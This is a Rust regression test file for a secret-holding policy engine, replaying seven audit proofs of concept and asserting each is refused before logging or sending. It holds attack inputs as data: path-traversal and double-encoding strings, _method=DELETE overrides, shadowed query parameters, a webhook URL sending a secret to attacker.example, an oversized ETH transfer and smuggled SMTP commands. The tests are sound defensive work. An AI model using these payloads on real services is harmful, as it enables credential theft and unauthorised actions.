//! Regressions of the audit proofs of concept (F1 to F7): values the owner's signed policy
//! should bound but the caller chose. Each attack of the proofs now fails: it is refused
//! before the log and before anything is sent, or the policy that would allow it is refused
//! at signing. Run with `--nocapture` to read what each refusal says.
#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::indexing_slicing,
    clippy::panic,
    missing_docs
)]

use std::cell::Cell;
use std::collections::VecDeque;

use engine::Error;
use engine::caller::Payload;
use engine::egress::{ClientIdentity, Stream, Transport};
use engine::error::TransportKind;
use engine::fields::Fields;
use engine::grant::{GrantTerms, RecordPin};
use engine::keys::{CallerKey, DeviceKey, NodeKey, UserKey};
use engine::log::MemorySink;
use engine::node::{CallerExchange, Clock, Node, Outcome, Response, StreamOutput};
use engine::policy::legacy::upgrade_json;
use engine::policy::{
    Caller, CallerRequest, Destination, FieldSpec, Injection, Input, Method, Operation, Policy,
    QueryRule, Receive, Return, RlpInput, RlpItem, Send, Target,
};
use engine::record::Record;
use engine::request::Request;

const OWNER: &str = "user-1";
const NOW: u64 = 1_800_000_000_000;
const DAY: u64 = 24 * 60 * 60 * 1000;

thread_local! {
    static TIME: Cell<u64> = const { Cell::new(0) };
}

struct TestClock;

impl Clock for &TestClock {
    fn now_ms(&self) -> u64 {
        TIME.with(Cell::get)
    }
}

fn clock() -> TestClock {
    TIME.with(|t| t.set(NOW));
    TestClock
}

#[derive(Default)]
struct FakeTransport {
    sent: Vec<Vec<u8>>,
    reply: Vec<u8>,
    replies: VecDeque<Vec<u8>>,
    written: Vec<Vec<u8>>,
    opened: usize,
}

impl Transport for FakeTransport {
    fn send(
        &mut self,
        _: &Destination,
        _: Option<&ClientIdentity>,
        wire: &[u8],
        _: usize,
    ) -> engine::Result<Vec<u8>> {
        self.sent.push(wire.to_vec());
        Ok(self.reply.clone())
    }

    fn open(
        &mut self,
        _: &Destination,
        _: Option<&ClientIdentity>,
    ) -> engine::Result<Box<dyn Stream + '_>> {
        self.opened += 1;
        Ok(Box::new(FakeStream(self)))
    }
}

struct FakeStream<'a>(&'a mut FakeTransport);

impl Stream for FakeStream<'_> {
    fn write(&mut self, bytes: &[u8]) -> engine::Result<()> {
        self.0.written.push(bytes.to_vec());
        Ok(())
    }

    fn read_until(&mut self, _: &[&[u8]], _: usize) -> engine::Result<Vec<u8>> {
        self.0
            .replies
            .pop_front()
            .ok_or(Error::transport(TransportKind::Closed, false))
    }
}

type TestNode<'c> = Node<MemorySink, &'c TestClock>;

fn caller_key() -> CallerKey {
    CallerKey::from_bytes(&mut [5u8; 32])
}

struct Setup<'c> {
    node: TestNode<'c>,
    record: Record,
}

impl Setup<'_> {
    fn log_len(&self) -> usize {
        self.node.with_sink(|sink| sink.entries().len())
    }
}

fn with_caller(mut policy: Policy) -> Policy {
    policy.callers = vec![Caller::new(
        "app",
        caller_key().public(),
        policy.operations.iter().map(|o| o.name().to_string()),
    )];
    policy
}

fn setup<'c>(clock: &'c TestClock, policy: Policy, values: &[(&str, &[u8])]) -> Setup<'c> {
    let device = DeviceKey::generate();
    let user_key = [7u8; 32];
    let signed = device.sign_policy(with_caller(policy)).unwrap();
    let mut f = Fields::new();
    for (name, value) in values {
        f.insert(name, value.to_vec()).unwrap();
    }
    let record = Record::seal(
        &UserKey::from_bytes(&mut user_key.clone()),
        "rec-1",
        OWNER,
        signed,
        &f,
    )
    .unwrap();
    let node = Node::new(NodeKey::generate(), MemorySink::new(), clock);
    let terms = GrantTerms {
        owner: OWNER.into(),
        expires_ms: NOW + DAY,
        issued_ms: NOW,
        pins: vec![RecordPin {
            record_id: "rec-1".into(),
            generation: 1,
        }],
    };
    let sealed = device
        .grant(
            &UserKey::from_bytes(&mut user_key.clone()),
            &node.identity(),
            terms,
        )
        .unwrap();
    node.grant(&sealed).unwrap();
    Setup { node, record }
}

fn call_http(s: &Setup<'_>, request: &Request, transport: &mut FakeTransport) -> Outcome<Response> {
    let auth = caller_key()
        .authorize(
            "app",
            &s.node.public_key(),
            &s.record,
            "call",
            &Payload::Http(Some(request)),
            NOW,
        )
        .unwrap();
    s.node
        .http(&s.record, "call", &auth, Some(request), transport)
}

fn call_derive(s: &Setup<'_>, input: &[u8]) -> engine::Result<Vec<u8>> {
    let auth = caller_key()
        .authorize(
            "app",
            &s.node.public_key(),
            &s.record,
            "derive",
            &Payload::Derive(input),
            NOW,
        )
        .unwrap();
    s.node.derive(&s.record, "derive", &auth, input)
}

fn call_stream(
    s: &Setup<'_>,
    destination: &Destination,
    exchanges: &[CallerExchange],
    transport: &mut FakeTransport,
) -> Outcome<StreamOutput> {
    let payload = Payload::Stream {
        destination,
        exchanges,
    };
    let auth = caller_key()
        .authorize(
            "app",
            &s.node.public_key(),
            &s.record,
            "call",
            &payload,
            NOW,
        )
        .unwrap();
    s.node
        .stream(&s.record, "call", &auth, destination, exchanges, transport)
}

/// The HTTPS operation `call` of the proofs: the caller's request within `contract`, with
/// `inject`, returning the status only.
fn https_op(
    destination: Destination,
    contract: CallerRequest,
    inject: Vec<Injection>,
) -> Operation {
    let mut send = Send::caller(contract);
    send.inject = inject;
    Operation::https("call", destination)
        .then(send)
        .then(Return::status())
}

fn inject(target: Target, template: &str) -> Injection {
    Injection {
        target,
        template: template.into(),
    }
}

fn header(name: &str, template: &str) -> Injection {
    inject(Target::Header { name: name.into() }, template)
}

fn request(method: Method, destination: Destination, path: &str, body: &[u8]) -> Request {
    Request {
        method,
        destination,
        path: path.into(),
        headers: vec![],
        body: body.to_vec(),
    }
}

fn text(wire: &[u8]) -> String {
    String::from_utf8_lossy(wire).into_owned()
}

fn ok_reply(body: &str) -> FakeTransport {
    FakeTransport {
        reply: format!(
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nX-Amzn-RequestId: r-1\r\nContent-Length: {}\r\n\r\n{body}",
            body.len()
        )
        .into_bytes(),
        ..Default::default()
    }
}

/// Asserts that `request` is refused with `rule` before the log and before anything is sent.
fn refused(s: &Setup<'_>, request: &Request, rule: &str) {
    let before = s.log_len();
    let mut transport = ok_reply("{}");
    let result = call_http(s, request, &mut transport).result;
    println!("{} {} -> {result:?}", request.method.as_str(), request.path);
    assert_eq!(
        result,
        Err(Error::RequestInvalid {
            rule: rule_of(rule)
        })
    );
    assert!(transport.sent.is_empty(), "nothing is sent");
    assert_eq!(s.log_len(), before, "nothing is logged");
}

/// The rule strings of the engine are `&'static str`; the tests name them by value.
fn rule_of(rule: &str) -> &'static str {
    const RULES: [&str; 10] = [
        "query parameter not allowed by the policy",
        "query value not allowed by the policy",
        "the caller sends a query parameter the policy injects",
        "path holds a dot segment or separator, as sent, after ; parameters or after decoding",
        "path holds an encoded % (%25), which a server may decode twice",
        "path holds an encoded /, \\ or .",
        "query names a reserved method-override parameter (_method and the like)",
        "body names a reserved method-override parameter (_method and the like)",
        "a path parameter placeholder must be a whole path segment the policy fills",
        "a path parameter placeholder must be a whole path segment, not in the query",
    ];
    RULES
        .into_iter()
        .find(|r| *r == rule)
        .unwrap_or_else(|| panic!("unknown rule {rule}"))
}

/// The SigV4 injections of `crates/transport/examples/aws_sigv4.rs`.
fn sigv4_headers() -> Vec<Injection> {
    let date = r#"time($unix, "%Y%m%d")"#;
    let stamp = r#"time($unix, "%Y%m%dT%H%M%SZ")"#;
    let scope = "us-east-1/sts/aws4_request";
    let key = format!(
        r#"hmac_sha256(hmac_sha256(hmac_sha256(hmac_sha256("AWS4" + secret_key, {date}), "us-east-1"), "sts"), "aws4_request")"#
    );
    let canonical = format!(
        r#"$method + "\n" + $pathname + "\n" + canonical_query($query) + "\nhost:" + $host + "\nx-amz-date:" + {stamp} + "\n\nhost;x-amz-date\n" + hex(sha256($body))"#
    );
    let to_sign = format!(
        r#""AWS4-HMAC-SHA256\n" + {stamp} + "\n" + {date} + "/{scope}\n" + hex(sha256({canonical}))"#
    );
    let authorization = format!(
        "AWS4-HMAC-SHA256 Credential={{{{access_key}}}}/{{{{ {date} }}}}/{scope}, SignedHeaders=host;x-amz-date, Signature={{{{ hex(hmac_sha256({key}, {to_sign})) }}}}"
    );
    vec![
        header("X-Amz-Date", &format!("{{{{ {stamp} }}}}")),
        header("Authorization", &authorization),
    ]
}

const STS_KEYS: [(&str, &[u8]); 2] = [
    ("access_key", b"AKIAOWNEREXAMPLE"),
    ("secret_key", b"wJalrXUtnFEMI/K7MDENG+bPxRfiCYOWNERKEY"),
];

/// F1. The caller had the node sign `Action=GetSessionToken` and read the temporary
/// credentials in the response. Now (a) the converted example policy takes no query
/// parameter and returns the status only; (b) the owner pins the action and lets back only
/// the identity members of the response.
#[test]
fn f1_the_query_is_pinned_and_the_response_projected() {
    let clock = clock();
    let sts = Destination::https("sts.amazonaws.com");
    let mint = request(
        Method::Get,
        sts.clone(),
        "/?Action=GetSessionToken&Version=2011-06-15&DurationSeconds=129600",
        b"",
    );

    // (a) The example policy of the old format, converted as it is.
    let mut converted = upgrade_json(
        &include_str!("fixtures/legacy/example-aws-sigv4.json")
            .replace("<caller public key>", &caller_key().public().to_b64()),
    )
    .unwrap()
    .policy;
    converted.operations[0].name = "call".into();
    let s = setup(&clock, converted, &STS_KEYS);
    refused(&s, &mint, "query parameter not allowed by the policy");

    // (b) The policy of the example now: the action and version pinned, a projection.
    let contract = CallerRequest::new([Method::Get])
        .paths(["/"])
        .headers(["Accept"])
        .query(QueryRule::fixed("Action", "GetCallerIdentity"))
        .query(QueryRule::fixed("Version", "2011-06-15"));
    let policy = Policy {
        fields: vec![
            FieldSpec::public("access_key"),
            FieldSpec::secret("secret_key"),
        ],
        callers: vec![],
        operations: vec![
            Operation::https("call", sts.clone())
                .then(Send {
                    inject: sigv4_headers(),
                    ..Send::caller(contract)
                })
                .then(Return::status().json("/GetCallerIdentityResponse/GetCallerIdentityResult")),
        ],
    };
    let s = setup(&clock, policy, &STS_KEYS);
    refused(&s, &mint, "query value not allowed by the policy");
    let other_action = request(
        Method::Get,
        sts.clone(),
        "/?Action=GetSessionToken&Version=2011-06-15",
        b"",
    );
    let before = s.log_len();
    let result = call_http(&s, &other_action, &mut FakeTransport::default()).result;
    println!("GET {} -> {result:?}", other_action.path);
    assert_eq!(
        result,
        Err(Error::RequestInvalid {
            rule: "query value not allowed by the policy"
        })
    );
    assert_eq!(s.log_len(), before);

    // The allowed action: whatever else the server puts in its answer stays on the node.
    let body = r#"{"GetCallerIdentityResponse":{"GetCallerIdentityResult":{"Account":"123456789012","Arn":"arn:aws:iam::123456789012:user/owner"},"Credentials":{"SessionToken":"FwoGZXIvYXdzEXAMPLESESSIONTOKEN"}}}"#;
    let mut transport = ok_reply(body);
    let identity = request(
        Method::Get,
        sts,
        "/?Action=GetCallerIdentity&Version=2011-06-15",
        b"",
    );
    let response = call_http(&s, &identity, &mut transport).result.unwrap();
    let returned = text(response.body());
    println!(
        "caller receives: {} {returned} {:?}",
        response.status(),
        response.headers()
    );
    assert_eq!(
        returned,
        r#"{"/GetCallerIdentityResponse/GetCallerIdentityResult":{"Account":"123456789012","Arn":"arn:aws:iam::123456789012:user/owner"}}"#
    );
    assert!(response.headers().is_empty());
}

/// F2. The caller sent a query parameter the policy injects, first, to shadow it.
#[test]
fn f2_the_caller_cannot_send_a_name_the_policy_injects() {
    let clock = clock();
    let api = Destination::https("api.example.com");
    let injects = vec![
        header("Authorization", "Bearer {{token}}"),
        inject(
            Target::Query {
                name: "scope".into(),
            },
            "read",
        ),
        inject(
            Target::Query {
                name: "limit".into(),
            },
            "10",
        ),
    ];
    // An owner cannot list a name it injects for the caller either.
    let listed = Policy {
        fields: vec![FieldSpec::secret("token")],
        callers: vec![],
        operations: vec![https_op(
            api.clone(),
            CallerRequest::new([Method::Get])
                .paths(["/v1/**"])
                .query(QueryRule::any("scope")),
            injects.clone(),
        )],
    };
    let at_signing = DeviceKey::generate()
        .sign_policy(with_caller(listed))
        .unwrap_err();
    println!("owner lists an injected name -> {at_signing}");
    assert!(matches!(at_signing, Error::PolicyInvalid { .. }));

    let policy = Policy {
        fields: vec![FieldSpec::secret("token")],
        callers: vec![],
        operations: vec![https_op(
            api.clone(),
            CallerRequest::new([Method::Get]).paths(["/v1/**"]),
            injects,
        )],
    };
    let s = setup(&clock, policy, &[("token", b"tok_live_9f8e7d6c5b4a")]);
    let attack = request(
        Method::Get,
        api.clone(),
        "/v1/export?scope=admin&limit=1000000",
        b"",
    );
    refused(
        &s,
        &attack,
        "the caller sends a query parameter the policy injects",
    );
    // Case and encoding do not hide the name.
    for path in ["/v1/export?SCOPE=admin", "/v1/export?%73cope=admin"] {
        refused(
            &s,
            &request(Method::Get, api.clone(), path, b""),
            "the caller sends a query parameter the policy injects",
        );
    }
}

/// F3. `..;` and double-encoded dot segments passed the prefix check and reached the server
/// with the token. None of them is sent now.
#[test]
fn f3_path_tricks_are_never_sent() {
    let clock = clock();
    let api = Destination::https("api.example.com");
    let policy = Policy {
        fields: vec![FieldSpec::secret("token")],
        callers: vec![],
        operations: vec![https_op(
            api.clone(),
            CallerRequest::new([Method::Get]).paths(["/public/**"]),
            vec![header("Authorization", "Bearer {{token}}")],
        )],
    };
    let s = setup(&clock, policy, &[("token", b"tok_live_9f8e7d6c5b4a")]);
    let dot =
        "path holds a dot segment or separator, as sent, after ; parameters or after decoding";
    for (path, rule) in [
        ("/public/..;/admin/users", dot),
        ("/public/.;/..;/admin/users", dot),
        (
            "/public/%252e%252e/admin/users",
            "path holds an encoded % (%25), which a server may decode twice",
        ),
        ("/public/..%3b/admin/users", dot),
        ("/public/../admin/users", dot),
        (
            "/public/%2e%2e/admin/users",
            "path holds an encoded /, \\ or .",
        ),
    ] {
        refused(&s, &request(Method::Get, api.clone(), path, b""), rule);
    }

    // With `%25` allowed, the second decoding still finds the dot segments.
    let lenient = Policy {
        fields: vec![FieldSpec::secret("token")],
        callers: vec![],
        operations: vec![https_op(
            api.clone(),
            CallerRequest::new([Method::Get])
                .paths(["/public/**"])
                .encoded_percent(true),
            vec![header("Authorization", "Bearer {{token}}")],
        )],
    };
    let s = setup(&clock, lenient, &[("token", b"tok_live_9f8e7d6c5b4a")]);
    for path in [
        "/public/%252e%252e/admin/users",
        "/public/%25%32%65%25%32%65/x",
    ] {
        refused(&s, &request(Method::Get, api.clone(), path, b""), dot);
    }
}

/// F4. `_method=DELETE` in the query or a form body turned an allowed POST into a DELETE on
/// frameworks that read it.
#[test]
fn f4_method_override_parameters_are_refused() {
    let clock = clock();
    let api = Destination::https("api.example.com");
    let policy = Policy {
        fields: vec![FieldSpec::secret("token")],
        callers: vec![],
        operations: vec![https_op(
            api.clone(),
            CallerRequest::new([Method::Get, Method::Post])
                .paths(["/v1/**"])
                .headers(["Content-Type"]),
            vec![header("Authorization", "Bearer {{token}}")],
        )],
    };
    let s = setup(&clock, policy, &[("token", b"tok_live_9f8e7d6c5b4a")]);
    refused(
        &s,
        &request(Method::Post, api.clone(), "/v1/repos/1?_method=DELETE", b""),
        "query names a reserved method-override parameter (_method and the like)",
    );
    for body in [
        &b"_method=DELETE"[..],
        b"a=1&_%6Dethod=DELETE",
        br#"{"_method":"DELETE"}"#,
        b"--b\r\nContent-Disposition: form-data; name=\"_method\"\r\n\r\nDELETE\r\n--b--\r\n",
    ] {
        let mut form = request(Method::Post, api.clone(), "/v1/repos/1", body);
        form.headers = vec![(
            "Content-Type".into(),
            "application/x-www-form-urlencoded".into(),
        )];
        refused(
            &s,
            &form,
            "body names a reserved method-override parameter (_method and the like)",
        );
    }

    // A contract that lists `_method` must also say it allows overrides.
    let listed = Policy {
        fields: vec![FieldSpec::secret("token")],
        callers: vec![],
        operations: vec![https_op(
            api,
            CallerRequest::new([Method::Post])
                .paths(["/v1/**"])
                .query(QueryRule::any("_method")),
            vec![],
        )],
    };
    let at_signing = DeviceKey::generate()
        .sign_policy(with_caller(listed))
        .unwrap_err();
    println!("owner lists _method without override_params -> {at_signing}");
    assert!(matches!(at_signing, Error::PolicyInvalid { .. }));
}

/// F5. The caller placed a path parameter in its own query (a webhook URL) and the secret went
/// there. A placeholder is now a whole segment of a template the owner signed.
#[test]
fn f5_path_parameters_go_only_where_the_template_says() {
    let clock = clock();
    let api = Destination::https("api.example.com");
    let account = vec![inject(
        Target::PathParam {
            name: "account".into(),
        },
        "{{account}}",
    )];
    let policy = Policy {
        fields: vec![FieldSpec::secret("account")],
        callers: vec![],
        operations: vec![https_op(
            api.clone(),
            CallerRequest::new([Method::Post])
                .paths(["/v1/accounts/{account}/webhooks"])
                .query(QueryRule::any("url")),
            account.clone(),
        )],
    };
    let s = setup(&clock, policy, &[("account", b"acct_secret_77aa88bb")]);
    for (path, rule) in [
        (
            "/v1/accounts/{account}/webhooks?url=https://attacker.example/c/{account}",
            "a path parameter placeholder must be a whole path segment, not in the query",
        ),
        (
            "/v1/webhooks?url=https://attacker.example/c/{account}",
            "a path parameter placeholder must be a whole path segment, not in the query",
        ),
    ] {
        refused(&s, &request(Method::Post, api.clone(), path, b""), rule);
    }
    // Outside a whole segment of the template, a placeholder is a literal that matches no
    // template.
    let before = s.log_len();
    let mut transport = ok_reply("{}");
    let result = call_http(
        &s,
        &request(
            Method::Post,
            api.clone(),
            "/v1/accounts/x{account}/webhooks",
            b"",
        ),
        &mut transport,
    )
    .result;
    println!("POST /v1/accounts/x{{account}}/webhooks -> {result:?}");
    assert!(matches!(
        result,
        Err(Error::RequestInvalid { .. }) | Err(Error::PathDenied { .. })
    ));
    assert!(transport.sent.is_empty());
    assert_eq!(s.log_len(), before);

    // Where the owner put it, it works.
    let mut transport = ok_reply("{}");
    call_http(
        &s,
        &request(
            Method::Post,
            api.clone(),
            "/v1/accounts/{account}/webhooks?url=https://hooks.example/x",
            b"",
        ),
        &mut transport,
    )
    .result
    .unwrap();
    let line = text(&transport.sent[0]).lines().next().unwrap().to_string();
    println!("allowed: {line}");
    assert_eq!(
        line,
        "POST /v1/accounts/acct_secret_77aa88bb/webhooks?url=https://hooks.example/x HTTP/1.1"
    );

    // A placeholder that is not a whole segment of a template is refused at signing.
    let partial = Policy {
        fields: vec![FieldSpec::secret("account")],
        callers: vec![],
        operations: vec![https_op(
            api,
            CallerRequest::new([Method::Post]).paths(["/v1/acct{account}/hooks"]),
            account,
        )],
    };
    let at_signing = DeviceKey::generate()
        .sign_policy(with_caller(partial))
        .unwrap_err();
    println!("owner writes a partial placeholder -> {at_signing}");
    assert!(matches!(at_signing, Error::PolicyInvalid { .. }));
}

const TO: &str = "a77ac4e5a77ac4e5a77ac4e5a77ac4e5a77ac4e5";

/// The owner's bounds on an unsigned legacy transaction: the one recipient, at most 1 ether,
/// no data, chain 1.
fn transfer_schema() -> Input {
    Input::Rlp(RlpInput {
        prefix: None,
        items: vec![
            RlpItem::any("/0"),
            RlpItem::at_most("/1", "100000000000"),
            RlpItem::at_most("/2", "21000"),
            RlpItem::equals("/3", TO),
            RlpItem::at_most("/4", "1000000000000000000"),
            RlpItem::equals("/5", ""),
            RlpItem::equals("/6", "01"),
            RlpItem::equals("/7", ""),
            RlpItem::equals("/8", ""),
        ],
    })
}

/// F6. A derivation signed whatever the caller sent: here a 1000 ETH transfer. The input
/// schema bounds the transaction the key signs.
#[test]
fn f6_the_input_schema_bounds_what_the_key_signs() {
    use k256::ecdsa::{RecoveryId, Signature, SigningKey, VerifyingKey};
    use sha3::Digest as _;

    let clock = clock();
    let secret_key = [0x11u8; 32];
    let key = SigningKey::from_slice(&secret_key).unwrap();
    let template = "{{ k256_sign_recoverable(key, keccak256($input)) }}";

    // Reading `$input` without a schema is refused at signing.
    let undeclared = Policy {
        fields: vec![FieldSpec::secret("key")],
        callers: vec![],
        operations: vec![Operation::derive("derive", template)],
    };
    let at_signing = DeviceKey::generate()
        .sign_policy(with_caller(undeclared))
        .unwrap_err();
    println!("no input schema -> {at_signing}");
    assert!(matches!(at_signing, Error::PolicyInvalid { .. }));

    let policy = Policy {
        fields: vec![FieldSpec::secret("key")],
        callers: vec![],
        operations: vec![Operation::derive("derive", template).input(transfer_schema())],
    };
    let s = setup(&clock, policy, &[("key", &secret_key)]);
    // The bytes of the proof (its list header is 2 bytes longer than its items, so it is not
    // canonical RLP and is refused as such).
    let proof = hexdecode(
        "ef80843b9aca0082520894a77ac4e5a77ac4e5a77ac4e5a77ac4e5a77ac4e58a3635c9adc5dea000000080018080",
    );
    let result = call_derive(&s, &proof);
    println!("the bytes of the proof -> {result:?}");
    assert_eq!(
        result,
        Err(Error::InputInvalid {
            rule: "input is not canonical RLP"
        })
    );
    let to = hexdecode(TO);
    let half_ether = hexdecode("06f05b59d3b20000");
    // The transfer the proof meant: 1000 ETH to the same recipient.
    let thousand = legacy_tx(&to, &hexdecode("3635c9adc5dea00000"), &[]);
    // 0.5 ETH to another recipient.
    let elsewhere = legacy_tx(&hexdecode(&"0b".repeat(20)), &half_ether, &[]);
    // A data payload (a contract call) under the same bounds otherwise.
    let with_data = legacy_tx(&to, &half_ether, &hexdecode("a9059cbb"));
    for (what, tx) in [
        ("1000 ETH", &thousand),
        ("another recipient", &elsewhere),
        ("a data payload", &with_data),
    ] {
        let before = s.log_len();
        let result = call_derive(&s, tx);
        println!("{what} -> {result:?}");
        assert_eq!(
            result,
            Err(Error::InputInvalid {
                rule: "input item value not allowed by the schema"
            }),
            "{what}"
        );
        assert_eq!(s.log_len(), before, "{what}: nothing is logged");
    }

    // Within the bounds: 0.5 ETH to the recipient is signed.
    let half = legacy_tx(&to, &half_ether, &[]);
    let out = call_derive(&s, &half).unwrap();
    let digest = sha3::Keccak256::digest(&half);
    let recovered = VerifyingKey::recover_from_prehash(
        &digest,
        &Signature::from_slice(&out[..64]).unwrap(),
        RecoveryId::from_byte(out[64] - 27).unwrap(),
    )
    .unwrap();
    assert_eq!(&recovered, key.verifying_key());
}

/// F7. After the login, the caller's exchanges were relayed as they were: here SMTP commands
/// under the owner's session. The `return` now lists the sends it relays.
#[test]
fn f7_a_stream_relays_only_the_sends_the_policy_lists() {
    let clock = clock();
    let smtp = Destination::new("smtp.example.com", 465);
    let login = |relay: Return| Policy {
        fields: vec![FieldSpec::public("user"), FieldSpec::secret("password")],
        callers: vec![],
        operations: vec![
            Operation::tls("call", smtp.clone())
                .then(Receive::until(["\r\n"]))
                .then(Send::write(
                    "AUTH PLAIN {{ b64(\"\\0\" + user + \"\\0\" + password) }}\r\n",
                ))
                .then(Receive::until(["\r\n"]))
                .then(relay),
        ],
    };
    let values: [(&str, &[u8]); 2] = [
        ("user", b"owner@example.com"),
        ("password", b"owner-smtp-pass"),
    ];
    let attack = [
        CallerExchange {
            send: b"MAIL FROM:<owner@example.com>\r\n".to_vec(),
            until: vec![b"\r\n".to_vec()],
        },
        CallerExchange {
            send: b"RCPT TO:<anyone@attacker.example>\r\n".to_vec(),
            until: vec![b"\r\n".to_vec()],
        },
    ];

    // As converted from the old format: no relay at all.
    let s = setup(&clock, login(Return::status()), &values);
    let mut transport = FakeTransport::default();
    let before = s.log_len();
    let result = call_stream(&s, &smtp, &attack, &mut transport).result;
    println!("no relay -> {result:?}");
    assert_eq!(
        result,
        Err(Error::RequestInvalid {
            rule: "the operation relays no exchange of the caller"
        })
    );
    assert_eq!((transport.opened, s.log_len()), (0, before));

    // An owner who allows a status check only.
    let s = setup(
        &clock,
        login(Return::relay([r"NOOP\r\n", r"QUIT\r\n"])),
        &values,
    );
    let mut transport = FakeTransport::default();
    let before = s.log_len();
    let result = call_stream(&s, &smtp, &attack, &mut transport).result;
    println!("NOOP and QUIT only -> {result:?}");
    assert_eq!(
        result,
        Err(Error::RequestInvalid {
            rule: "a send of the caller matches no pattern the operation relays"
        })
    );
    assert_eq!((transport.opened, s.log_len()), (0, before));
    assert!(transport.written.is_empty());

    // A send must match a pattern whole: a second command after an allowed one is refused.
    let smuggled = [CallerExchange {
        send: b"NOOP\r\nRCPT TO:<anyone@attacker.example>\r\n".to_vec(),
        until: vec![b"\r\n".to_vec()],
    }];
    let result = call_stream(&s, &smtp, &smuggled, &mut FakeTransport::default()).result;
    println!("NOOP then RCPT in one send -> {result:?}");
    assert!(result.is_err());

    // What is listed runs.
    let mut transport = FakeTransport {
        replies: VecDeque::from([
            b"220 ready\r\n".to_vec(),
            b"235 ok\r\n".to_vec(),
            b"250 ok\r\n".to_vec(),
        ]),
        ..FakeTransport::default()
    };
    let noop = [CallerExchange {
        send: b"NOOP\r\n".to_vec(),
        until: vec![b"\r\n".to_vec()],
    }];
    let out = call_stream(&s, &smtp, &noop, &mut transport)
        .result
        .unwrap();
    assert_eq!(out.reads, vec![b"250 ok\r\n".to_vec()]);
}

/// The RLP of a byte string (short forms only: the items here are under 56 bytes).
fn rlp_bytes(bytes: &[u8]) -> Vec<u8> {
    match bytes {
        [b] if *b < 0x80 => vec![*b],
        _ => {
            let mut out = vec![0x80 + u8::try_from(bytes.len()).unwrap()];
            out.extend_from_slice(bytes);
            out
        }
    }
}

/// An unsigned legacy transaction for chain 1 (EIP-155): nonce 0, gas price 1 gwei, gas
/// 21000.
fn legacy_tx(to: &[u8], value: &[u8], data: &[u8]) -> Vec<u8> {
    let items: Vec<u8> = [
        rlp_bytes(&[]),
        rlp_bytes(&hexdecode("3b9aca00")),
        rlp_bytes(&hexdecode("5208")),
        rlp_bytes(to),
        rlp_bytes(value),
        rlp_bytes(data),
        rlp_bytes(&[1]),
        rlp_bytes(&[]),
        rlp_bytes(&[]),
    ]
    .concat();
    let mut out = vec![0xc0 + u8::try_from(items.len()).unwrap()];
    out.extend(items);
    out
}

fn hexdecode(s: &str) -> Vec<u8> {
    (0..s.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&s[i..i + 2], 16).unwrap())
        .collect()
}
